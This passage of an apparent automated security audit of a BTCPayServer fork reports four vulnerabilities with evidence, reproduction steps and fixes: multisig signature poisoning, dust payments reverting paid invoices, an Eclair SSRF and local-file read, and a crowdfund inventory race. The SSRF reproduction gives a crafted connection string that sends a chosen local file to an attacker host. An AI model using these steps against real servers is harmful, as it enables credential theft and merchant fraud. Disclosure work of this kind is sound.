   Entry point: any user with CanSignWalletTransactions on the store posts an arbitrary PSBT with SigningContext.PendingTransactionId (POST /wallets/{walletId}/vault) and reaches CollectSignature; nothing restricts which pubkeys' partial signatures that user may supply.
6. [BTCPayServer/Plugins/Wallets/Controllers/UIWalletsController.PSBT.cs:156](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Wallets/Controllers/UIWalletsController.PSBT.cs#L156)
   Second entry point: POST /wallets/{walletId}/psbt command=collect requires only CanSignWalletTransactions and forwards the user-supplied PSBT to RedirectToWalletPSBTReady (line 190).
7. [BTCPayServer/Plugins/Wallets/Controllers/UIWalletsController.cs:128–175](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Wallets/Controllers/UIWalletsController.cs#L128-L175)
   ViewPendingTransaction lets the same CanSignWalletTransactions holder read the merged pending PSBT, whose witness/redeem script exposes every cosigner pubkey needed to craft the poisoned entries.
8. [BTCPayServer.Data/Migrations/20260203123000\_AddWalletRoles.cs:21](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Data/Migrations/20260203123000_AddWalletRoles.cs#L21)
   The shipped 'Multisigner Guest' store role carries only btcpay.store.cansigntransactions: the attacker position is a built-in, lowest-privilege wallet role that lacks cancel/create/broadcast permissions.
9. [BTCPayServer/Plugins/Wallets/Views/UIWallets/WalletTransactions.cshtml:300–316](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Wallets/Views/UIWallets/WalletTransactions.cshtml#L300-L316)
   The pending list renders SignaturesCollected/SignaturesMissing from the blob, so poisoned counters show e.g. '2 collected, 0 missing' while the transaction stays Pending and can never finalize.
10. [BTCPayServer.Tests/MultisigTests.cs:384–398](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Tests/MultisigTests.cs#L384-L398)
   Context: the maintainers' own test submits an invalid signature attributed to another signer's pubkey and asserts it is retained and counted (2 collected); it only checks that a different, unpoisoned signer can still complete, not the case where the poisoned signer's genuine signature arrives later.

## Impact
Integrity: stored signature progress and the UI counters are falsified (shows complete while unsignable) and legitimate cosigners' genuine signatures are dropped on merge. Availability: the store's server-side multisig spending workflow is blocked for as long as the attacker keeps poisoning, an effective cancel without the CanCancelWalletTransactions permission. Funds are not lost and signers can still finalise PSBTs out of band and submit the finalised result, so impact is partial.

## Reproduction steps
1. Attacker: a store member with CanSignWalletTransactions (the shipped 'Multisigner Guest' role) who is a cosigner of a server-coordinated multisig wallet. They open the pending transaction (ViewPendingTransaction exposes all cosigner pubkeys), add well-formed but invalid partial signatures keyed to the other cosigners' pubkeys, and submit through the normal signing POST. No defence has to be defeated and no special configuration or race is needed; a multisig wallet with a pending transaction is the feature's normal operating state.

## Recommended fix
1. CollectSignature trusts partial signatures by pubkey membership only; it never verifies that a PartialSigs entry is a valid signature over the input's sighash for that pubkey, so bogus entries are stored, counted and shadow genuine ones. Fix criteria: Before merging, every partial signature in the submitted PSBT must be cryptographically verified against the corresponding input and pubkey; invalid entries must be rejected and neither retained nor counted. Verify with a test where signer A submits garbage signatures for B's pubkey: the PSBT is rejected, SignaturesCollected stays unchanged, and B's later genuine signature finalizes the transaction.
2. The submitter is not bound to the keys they are entitled to sign for and the retained PSBT history records no submitter identity, so a poisoned slot can be neither prevented nor attributed. Fix criteria: Restrict the pubkeys a submitter may add partial signatures for to the account keys mapped to that user (AccountKeySettings.SignerUserId / RootFingerprint) where such a mapping exists, and record the submitting user with each retained PSBT so an owner can identify and remove the offending cosigner.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Improper verification of cryptographic signature
**CWE:** [CWE-347](https://cwe.mitre.org/data/definitions/347.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257577

---

# Dust payment below network-fee surcharge is counted negative, un-paying a fully paid invoice

## Details
BTCPay charges an on-chain 'network fee' surcharge per payment (store setting described in GeneralSettings.cshtml as '... only if the customer makes more than one payment for the invoice' (default, NetworkFeeMode.MultiplePaymentsOnly) or '... on every payment' (Always)). In the default mode NBXplorerListener.ReceivedPayment raises prompt.PaymentMethodFee to feeRate*100 vbytes once the first payment is recorded. Each subsequently recorded payment snapshots that surcharge into its blob (PaymentDataExtensions.Set) and PaymentEntity.UpdateAmounts computes Net = Value - PaymentMethodFee without a floor. The listener records any NBXplorer-matched output paying a tracked invoice address, of any value, as an Accounted payment. A dust output (294 sat for P2WPKH) smaller than the surcharge (100 vbytes at >= 3 sat/vB) is therefore a payment with negative net, and InvoiceEntity.UpdateTotals subtracts it from the invoice's paid total.

Consequence 1 (un-paying a paid invoice, default store settings): after a customer pays an invoice in full (Processing, InvoiceProcessing webhook sent), the deposit address is visible to everyone in the mempool/blockchain. Anyone who sends one dust output to it (an indiscriminate 'dusting' transaction suffices; the payer can also do it) causes the watcher, on the ReceivedPayment event, to find MinimumNetDue = (surcharge - dust) > 0 and execute the Processing branch at InvoiceWatcher.cs:148-153: Status reverts to New with ExceptionStatus PaidPartial, with no dedicated InvoiceEvent or webhook. The customer's real payment confirming does not help, since the negative net remains in the sum; at ExpirationTime the invoice becomes Expired with PaidPartial and the merchant receives InvoiceExpired{partiallyPaid}/InvoiceExpiredPaidPartial for an order the customer paid in full. Sending the dust before the customer pays also works: in MultiplePaymentsOnly it triggers the surcharge so the already-displayed BIP21 amount becomes insufficient. The attacker spends only dust plus a mining fee. The branch is commented as RBF handling and the surcharge is documented as charged to the customer for their own extra payments; a third party's output being accounted as the customer's negative payment contradicts both.

Consequence 2 (secondary; requires the non-default Always mode): for a top-up invoice (PoS top-up items, crowdfund any-amount contributions, Greenfield invoices without amount, pull-payment top-ups) a dust first payment yields Price := negative Net (InvoiceWatcher.cs:107-108, persisted by UpdateInvoicePrice). UpdateTotals then gives MinimumNetDue = 0 and the settlement check at lines 158-171 computes minimumDue = 0 + (negative unconfirmed net) <= 0, so the invoice is Settled with Confirmed/Completed events and the InvoiceSettled webhook while its only payment is unconfirmed, bypassing SpeedPolicy; PullPaymentHostedService.HandleTopUp writes a Completed payout with Amount = -Price (a positive debit) and crowdfund totals shrink. This yields no funds to the attacker and is not what the metrics rest on.

Root cause: the per-payment surcharge is unconditionally subtracted from each payment's value, allowing negative payment amounts, and the state machine (underpaid revert, settlement test, top-up pricing) assumes payment nets are non-negative. Attack requirements: the invoice must be in Processing (between the customer's payment and settlement at the store's confirmation target) and the store's network fee rate (20-block estimate, clamped to the node's min relay fee) must exceed roughly 3 sat/vB so that a relayable dust output is below the surcharge; the store must not use NetworkFeeMode.Never.

## Evidence
1. [BTCPayServer/Services/Invoices/InvoiceEntity.cs:1069–1083](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Invoices/InvoiceEntity.cs#L1069-L1083)
   Root cause: PaymentEntity.UpdateAmounts computes PaidAmount.Net = Value - PaymentMethodFee with no lower bound. A payment whose value is smaller than the per-payment network-fee surcharge snapshotted in its blob therefore has a negative net, which is then multiplied by the rate into InvoicePaidAmount.Net.
2. [BTCPayServer/Services/Invoices/InvoiceEntity.cs:393–433](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Invoices/InvoiceEntity.cs#L393-L433)
   UpdateTotals sums the net of every Accounted payment (Status Settled or Processing, line 1038), negative ones included, into PaidAmount.Net and derives MinimumNetDue = Price*(1-tolerance) - PaidAmount.Net (line 420). A negative-net payment reduces the paid total of an otherwise fully paid invoice and re-creates a positive MinimumNetDue (IsUnderPaid).
3. [BTCPayServer/Payments/Bitcoin/NBXplorerListener.cs:158–186](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/Bitcoin/NBXplorerListener.cs#L158-L186)
   The websocket path records every NBXplorer-matched output paying a tracked invoice address as a payment with Amount = output value and Status Processing/Settled (both Accounted). There is no minimum value, no check that the output's value covers the surcharge, and no status filter on the invoice; anyone on the Bitcoin network who sees the address can create such an output. The polling path at lines 384-430 behaves the same.
4. [BTCPayServer/HostedServices/InvoiceWatcher.cs:134–153](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/InvoiceWatcher.cs#L134-L153)
   For a Processing invoice, IsUnderPaid (MinimumNetDue > 0) reverts Status to New with ExceptionStatus PaidPartial. The branch is commented as RBF handling, but a third party's negative-net dust payment makes a fully paid invoice underpaid and fires it. The watcher runs on the ReceivedPayment event (lines 251-254) so the revert happens as soon as the dust transaction is seen in the mempool.
5. [BTCPayServer/Payments/Bitcoin/NBXplorerListener.cs:436–452](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/Bitcoin/NBXplorerListener.cs#L436-L452)
   In the default NetworkFeeMode.MultiplePaymentsOnly, ReceivedPayment raises prompt.PaymentMethodFee from 0 to feeRate*100 vbytes after the first payment is recorded, so every later payment to the same invoice, including a third party's dust output, is charged the surcharge, while the customer's first payment was snapshotted with fee 0.
6. [BTCPayServer/Data/PaymentDataExtensions.cs:11–23](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Data/PaymentDataExtensions.cs#L11-L23)
   PaymentData.Set snapshots the prompt's current PaymentMethodFee into the payment blob regardless of the payment's value, so a dust output carries the full per-payment surcharge.
7. [BTCPayServer/Payments/Bitcoin/BitcoinLikePaymentHandler.cs:146–161](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/Bitcoin/BitcoinLikePaymentHandler.cs#L146-L161)
   The surcharge is the fee for 100 vbytes at the store's network fee rate (FeeProviderFactory: mempool.space/NBXplorer estimate for a 20-block target, clamped to at least the node's min relay fee). Above roughly 3 sat/vB it exceeds the 294 sat P2WPKH dust limit, so a relayable dust output has negative net. In Always mode the surcharge applies from invoice creation; in the default mode from the second payment on.
8. [BTCPayServer/HostedServices/InvoiceWatcher.cs:156–171](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/InvoiceWatcher.cs#L156-L171)
   Settlement test: minimumDue = MinimumNetDue + sum(net of Processing payments) <= 0. For a top-up invoice on an Always-mode store whose only payment is an unconfirmed dust output with negative net, MinimumNetDue is 0 and the unconfirmed sum is negative, so the invoice is Settled at zero confirmations regardless of SpeedPolicy (secondary consequence; non-default mode).
9. [BTCPayServer/HostedServices/InvoiceWatcher.cs:99–110](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/InvoiceWatcher.cs#L99-L110)
   Top-up invoices take Price := first payment's InvoicePaidAmount.Net and persist it via UpdateInvoicePrice; with a dust first payment under Always mode this persists a negative Price, consumed by PullPaymentHostedService.HandleTopUp (payout Amount = -Price) and crowdfund totals (lead lead-invoicewatcher-105-19ae).
10. [BTCPayServer/Data/StoreBlob.cs:26–36](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Data/StoreBlob.cs#L26-L36)
   NetworkFeeMode has no initializer, so the default is enum value 0 = MultiplePaymentsOnly; PaymentTolerance defaults to 0. The default store configuration is therefore affected by the paid-invoice revert.
11. [BTCPayServer/Services/Invoices/InvoiceRepository.cs:69–78](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Invoices/InvoiceRepository.cs#L69-L78)
   GetInvoiceFromAddress returns the invoice for any tracked address without a status filter and AddressInvoices rows are never removed, so outputs to a Processing invoice's address are attributed to it.

## Impact
Integrity of invoice state, a named asset: a fully paid invoice is turned into New/PaidPartial and ends Expired (paid partial) with the corresponding webhooks, so the merchant does not fulfil a paid order and the customer must dispute; the merchant can only recover by manually marking it settled. In the non-default Always mode a top-up invoice can additionally be driven to Settled at zero confirmations with a negative persisted price. The attacker cannot choose arbitrary state or values and gains no funds, so Integrity LOW. No confidentiality impact; the service stays available.

## Reproduction steps
1. Attacker: any anonymous Bitcoin-network participant. The customer's own payment transaction exposes the invoice's deposit address in the mempool; the attacker (or an indiscriminate dusting campaign, or the payer) broadcasts one transaction with a dust output to it while the invoice is Processing. NBXplorer reports the output, NBXplorerListener records a payment carrying the bumped surcharge, UpdateAmounts yields a negative net, and the watcher reverts the fully paid invoice to New/PaidPartial. No authentication or victim interaction. Conditions outside the attacker's control: the store's fee mode (default MultiplePaymentsOnly is affected; only Never is immune) and a fee-rate estimate above roughly 3 sat/vB so the 100-vbyte surcharge exceeds the dust limit, plus the pre-settlement window, so AT is PRESENT.

## Recommended fix
1. PaymentEntity.UpdateAmounts subtracts the full per-payment network-fee surcharge from any payment regardless of its value, and the on-chain listener accounts every matched output of any value, so a payment smaller than the surcharge has a negative net and reduces the invoice's paid total. Fix criteria: A payment can never reduce the amount considered paid: its net contribution must be bounded below by zero, or an output whose value does not cover the surcharge must be recorded as not accounted (dust) rather than as a negative payment. Verify by paying an invoice in full, sending a 294 sat output to its address under MultiplePaymentsOnly and Always, and confirming the invoice stays Processing and settles when the real payment confirms.
2. InvoiceWatcher's settlement test (MinimumNetDue + unconfirmed net <= 0) and top-up pricing (Price := first payment net) assume non-negative payment nets; a negative unconfirmed net makes a top-up invoice Settled at zero confirmations and persists a negative price. Fix criteria: Settlement must require that the net of confirmed (Settled) payments alone covers the minimum due, and a top-up price must be strictly positive. Verify that a top-up invoice receiving only an unconfirmed dust payment under Always mode remains unsettled and never stores a negative Price.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Incorrect calculation
**CWE:** [CWE-682](https://cwe.mitre.org/data/definitions/682.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257575

---

# Eclair bitcoin-host/bitcoin-auth keys bypass Lightning SSRF guard and read local files

## Details
Non-admin store members may connect a store to an external Lightning node only if `Extensions.IsSafeLightningConnectionString` (Extensions.cs:401-428) accepts the connection string; the same boolean selects the SSRF-protected `lightning.safe` HttpClient (LightningLikePaymentHandler.cs:275-289, LightningClientFactoryService.cs:41-57). The gate splits the string into key/value pairs, rejects keys ending in `filepath`/`directorypath`, LND certificate-pinning options, unix sockets and local or non-resolvable `server` hosts, and otherwise trusts the string. It never examines the Eclair-specific keys `bitcoin-host` and `bitcoin-auth`, which the registered `EclairConnectionStringHandler` (BTCPayServer.Lightning.All 1.7.13, BTCPayServerServices.cs:126-127) turns into an NBitcoin `RPCClient` used by `GetDepositAddress`; the repository's own setup page (SetupLightningNode.cshtml:137-145) and startup help text (BTCPayServerServices.cs:252-254) document exactly this usage, including a form with `bitcoin-host` and no `bitcoin-auth`.

The SSRF guard is a `ConnectCallback` installed on the `lightning.safe` SocketsHttpHandler only (SSRFProtectionExtensions.cs:19-30, default-on: BTCPayServerOptions.cs:113). The RPC client built from `bitcoin-host` uses NBitcoin's own transport, so neither the hostname check in the gate nor the resolve-time address check in the guard covers it. `IExtendedLightningClient.Validate()` is a BTCPay-repo interface that no library client implements, so no further validation runs on the stored string. The result: a store-supplied string classified safe (`AllowUnsafeConnection=false`) still carries a second, unchecked network destination and an unchecked credential source.

Two consequences. (1) SSRF-guard bypass: when the store's `POST /api/v1/stores/{id}/lightning/{crypto}/address` endpoint is invoked, the Eclair client posts a bitcoind JSON-RPC `getnewaddress` with attacker-chosen Basic credentials to the attacker-chosen `bitcoin-host` (host, port and, since a full URI is accepted, path) — bitcoind, NBXplorer, LND REST, Postgres, cloud metadata — and `LightningUnavailableExceptionFilter` (GreenfieldLightningNodeApiController.cs:22-29) echoes the exception type and message, giving a connect/HTTP-status/parse oracle. The method and body are fixed. (2) Local file read: NBitcoin's documented `RPCCredentialString` syntax accepts `cookiefile=<path>`, and `RPCClient` reads that file at construction to build `Authorization: Basic base64(contents)`. With `bitcoin-host=<attacker host>` and `bitcoin-auth=cookiefile=<path>`, the deposit-address call sends the file's contents to the attacker. The `filepath` key filter does not catch this because the path is a value, not a key.

Assumptions (dependencies not inspectable in this checkout): (a) BTCPayServer.Lightning.Eclair 1.7.13 builds `new RPCClient(bitcoinAuth, bitcoinHost, network)` from these keys and calls it in `GetDepositAddress`, as the repository help text states, without injecting the guarded HttpClient; (b) NBitcoin 10.0.15 `RPCCredentialString` parses `cookiefile=` and `RPCClient` reads the file for Basic auth over its own HttpClient. The NBitcoin version recalled here rejects cookie contents not starting with `__cookie__:`, which would confine (2) to bitcoind/NBXplorer-format cookie files (such as the NBXplorer cookie BTCPay is itself configured to read via `btc.explorer.cookiefile`, default `~/.nbxplorer/Main/.cookie`); if no such check exists, any file readable by the root process (`/proc/self/environ`, `/datadir/settings.config`, mounted macaroons) is exfiltrated. If (b) fails entirely, consequence (1) stands on (a) alone.

## Evidence
1. [BTCPayServer/Extensions.cs:401–427](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Extensions.cs#L401-L427)
   IsSafeLightningConnectionString is the sole gate deciding whether a non-admin's connection string may be saved and whether the SSRF-protected HttpClient is used. It rejects keys ending in 'filepath'/'directorypath', LND certthumbprint/allowinsecure, unix sockets, and inspects only the 'server' value (lines 413-427). The Eclair keys 'bitcoin-host' (a second network destination) and 'bitcoin-auth' (which NBitcoin's RPCCredentialString accepts as 'cookiefile=<path>') are never examined, so a string naming an internal host or a local file is classified safe.
2. [BTCPayServer/Payments/Lightning/LightningLikePaymentHandler.cs:270–298](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Payments/Lightning/LightningLikePaymentHandler.cs#L270-L298)
   For a non-admin the only protection is the IsSafe check (275-286, error text forbids pointing 'to a local endpoint'); on 'safe' the config is stored with AllowUnsafeConnection=false and the client is built with the safe HttpClient. Validate() runs only for IExtendedLightningClient, a BTCPay-repo interface no library client (including Eclair) implements, so no further validation of the string's other destinations occurs.
3. [BTCPayServer/Services/LightningClientFactoryService.cs:41–56](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/LightningClientFactoryService.cs#L41-L56)
   Create() picks the named HttpClient ('lightning.safe' when allowUnsafe is false) solely from the 'server' host and hands it to each connection-string handler factory; the SSRF guard travels only with that HttpClient, so any transport a handler constructs itself (the NBitcoin RPCClient for bitcoin-host) is outside it.
4. [BTCPayServer/Hosting/BTCPayServerServices.cs:124–140](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/BTCPayServerServices.cs#L124-L140)
   EclairConnectionStringHandler is registered (126-127) and receives the named HttpClient; UseSSRFProtection (138) is attached only to the 'lightning.safe' HttpClient. The bitcoind RPC client the Eclair handler builds from bitcoin-host/bitcoin-auth is an NBitcoin RPCClient with its own transport.
5. [BTCPayServer/SSRFProtectionExtensions.cs:19–29](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/SSRFProtectionExtensions.cs#L19-L29)
   The guard is implemented as a ConnectCallback on the specific SocketsHttpHandler of the HttpClient it is applied to; it is not process-wide, so requests issued by other HttpClient instances (NBitcoin's RPCClient) never pass through the address check.
6. [BTCPayServer/Controllers/GreenField/GreenfieldLightningNodeApiController.Store.cs:146–175](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldLightningNodeApiController.Store.cs#L146-L175)
   GetLightningClient returns the store's external client via LightningClientFactoryService.Create for any caller holding the store permission; the admin requirement (169-172) applies only to the internal node. This is how the stored Eclair string becomes a live client for the attacker's request.
7. [BTCPayServer/Controllers/GreenField/GreenfieldLightningNodeApiController.Store.cs:90–95](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldLightningNodeApiController.Store.cs#L90-L95)
   POST /api/v1/stores/{storeId}/lightning/{cryptoCode}/address (GetDepositAddress) is gated by CanUseLightningNodeInStore, which CanModifyStoreSettings includes (BTCPayServerServices.cs:580-593), i.e. the same store Owner/Manager who can save the connection string.
8. [BTCPayServer/Controllers/GreenField/GreenfieldLightningNodeApiController.cs:218–223](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldLightningNodeApiController.cs#L218-L223)
   The base GetDepositAddress calls lightningClient.GetDepositAddress(), which for the Eclair client is the documented trigger of the bitcoind RPC request to bitcoin-host, and returns the result to the caller.
9. [BTCPayServer/Controllers/GreenField/GreenfieldLightningNodeApiController.cs:22–28](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldLightningNodeApiController.cs#L22-L28)
   LightningUnavailableExceptionFilter returns the exception type and message to the caller in a 503, giving the attacker the result of the unguarded request (connection refused vs. HTTP status vs. parse error) as a host/port/service oracle.
10. [BTCPayServer/Views/UIStores/SetupLightningNode.cshtml:137–144](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Views/UIStores/SetupLightningNode.cshtml#L137-L144)
   The product's own setup page documents that 'bitcoin-host' and 'bitcoin-auth' are accepted for type=eclair and are used by GetDepositAddress, establishing from the repository that the Eclair client performs bitcoind RPC against bitcoin-host when that endpoint is invoked.
11. [BTCPayServer/Hosting/BTCPayServerServices.cs:252–254](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/BTCPayServerServices.cs#L252-L254)
   Server-side help text shows the accepted forms including bitcoin-host without bitcoin-auth, matching NBitcoin RPCCredentialString semantics (default/cookie-file credentials), which is what makes 'bitcoin-auth=cookiefile=<path>' a plausible accepted value.

## Impact
The control the project ships for store-supplied Lightning endpoints is bypassed: a tenant reaches arbitrary internal host:port with an HTTP POST and learns from the echoed exception whether the port is closed, speaks HTTP (status) or returns non-JSON — an internal service/port oracle (confidentiality LOW). Method and body are fixed (bitcoind getnewaddress) with attacker-chosen path and Basic credentials: an unauthorized request from the server, no controlled write (integrity LOW). The cookiefile leg leaks a chosen local file; rated LOW because its breadth (cookie-format files such as the NBXplorer cookie vs. arbitrary files incl. /proc/self/environ of the root process) turns on NBitcoin's unverified cookie-content check — HIGH if arbitrary files pass. No availability impact. Subsequent-system impact: The request originates from the server's network position and reaches backends the tenant cannot otherwise address (NBXplorer, bitcoind, LND REST, cloud metadata). What crosses is a fixed getnewaddress POST plus a connect/status oracle about those systems, and — if the NBXplorer cookie is readable at its default path and passes NBitcoin's content check — that backend's credential sent to the attacker. Rated LOW confidentiality for enumeration/credential disclosure; no demonstrated integrity effect because the request body is fixed.

## Reproduction steps
1. Attacker is a self-registered user owning a store (default role Owner, StoreRepository.cs:138) or any API key with CanModifyStoreSettings on a store, which includes CanUseLightningNodeInStore. Two authenticated requests: save 'type=eclair;server=https://<public host>;password=x;bitcoin-host=<internal host:port or attacker URI>;bitcoin-auth=u:p|cookiefile=<path>' via the UI (UIStoresController.LightningLike.cs:132-175) or PUT /api/v1/stores/{id}/payment-methods/BTC-LN (passes IsSafe because only 'server' is inspected), then POST /api/v1/stores/{id}/lightning/BTC/address. Works against the default deployment with the SSRF guard enabled; no race, no non-default setting. Observables: the echoed 503 error text and, for the cookiefile variant, the request arriving at the attacker's host.

## Recommended fix
1. IsSafeLightningConnectionString validates only the 'server' destination and key names, while the Eclair handler derives a second network destination (bitcoin-host) and a credential source that may be a file path (bitcoin-auth=cookiefile=…) from other keys; those are then used over a transport outside the SSRF-protected HttpClient. Fix criteria: For non-admin-supplied connection strings, every network destination and every credential/file reference the string can produce must be validated (bitcoin-host subject to the same public-address rule as server, and cookiefile/default-cookie credential forms rejected), or the Eclair bitcoind-RPC keys must be refused outright for non-admins. Verify that a store Owner cannot save a type=eclair string containing bitcoin-host pointing at a private address or bitcoin-auth=cookiefile=…, and that the deposit-address endpoint for such a store never performs an unguarded outbound request or file read.
2. Auxiliary clients created by Lightning connection-string handlers (NBitcoin RPCClient) do not use the SSRF-guarded HttpClient, so endpoint safety is enforced only at string-validation time rather than at connect time. Fix criteria: Any outbound connection made on behalf of a store-configured Lightning connection string must go through the SSRF-protected transport when AllowUnsafeConnection is false; verify by configuring a resolvable public hostname for bitcoin-host that resolves to a private address and confirming the connection is refused.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Server-Side Request Forgery
**CWE:** [CWE-918](https://cwe.mitre.org/data/definitions/918.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** LOW
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257455

---

# Crowdfund perk inventory check is not atomic with the asynchronous inventory decrement

## Details
The public crowdfund contribution action ContributeToCrowdfund (POST /apps/{appId}/crowdfund, UICrowdfundController.cs:89-98; anonymous, [IgnoreAntiforgeryToken], CORS All) verifies perk stock by parsing the app's stored PerksTemplate into memory (`AppService.Parse(settings.PerksTemplate, false)`, line 128) and rejecting the request only when `choice.Inventory is <= 0` (lines 147-150, "Option was out of stock"). Nothing reserves the unit. The invoice is then created through CreateInvoiceCoreRaw with ItemCode = ChoiceKey (lines 212-243); that method fetches exchange rates over the network, creates payment prompts and persists the invoice before publishing InvoiceEvent.Created (UIInvoiceController.cs:247-295). Only afterwards does AppInventoryUpdaterHostedService (a sequential event consumer, AppInventoryUpdaterHostedService.cs:28-70) call AppService.UpdateInventory (AppService.cs:404-450), which re-reads the Apps row and applies -1 to the PerksTemplate item under an xmin optimistic retry, never re-validating availability and with no floor at zero.

Any number of concurrent contributions issued inside the window (settings read -> rate fetch -> prompt creation -> invoice save -> event dispatch) observe the same inventory and all pass; a perk with Inventory 1 can be sold K times and its stored/displayed inventory becomes 1-K (the public page renders "Sold out" only for inventory <= 0, ViewCrowdfund.cshtml:329-331; the hosted service restocks on Expired/MarkedInvalid, showing the maintainers intend inventory as an enforced limit). Two entry points reach the check: the HTTP POST, whose only control is the per-RemoteAddress PublicInvoices throttle (4r/min burst=10 delay=3, Startup.cs:307) keyed on an address any client can set via X-Forwarded-For (Startup.cs:325-332, KnownProxies cleared); and the anonymously mapped SignalR AppHub (/apps/hub, Startup.cs:374), whose CreateInvoice method (AppHub.cs:39-48) calls ContributeToCrowdfund directly so no MVC filter runs at all - an attacker opens N hub connections, each invoking ListenToCrowdfundApp(appId) then CreateInvoice, and lands N parallel contributions with no throttle. Limited perks (physical rewards, tickets) are the merchant's enforced constraint; it is defeated for unauthenticated contributors.

This is the crowdfund entry point to the same asynchronous-decrement sink as the verified record pos-inventory-check-then-act-race (PoS controller). The fix locations differ: the PoS controller's check does not cover the crowdfund controller's check at lines 128-150, so both request paths must reserve atomically.

## Evidence
1. [BTCPayServer/Plugins/Crowdfund/Controllers/UICrowdfundController.cs:128–150](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Crowdfund/Controllers/UICrowdfundController.cs#L128-L150)
   Perk availability is checked against an in-memory parse of the settings snapshot (`AppService.Parse(settings.PerksTemplate, false)`, line 128) and rejected only when `choice.Inventory is <= 0` (lines 147-150). Nothing reserves or decrements the unit here; every concurrent request parses the same stored template and passes. This is the code the fix must change (reserve atomically before persisting the invoice).
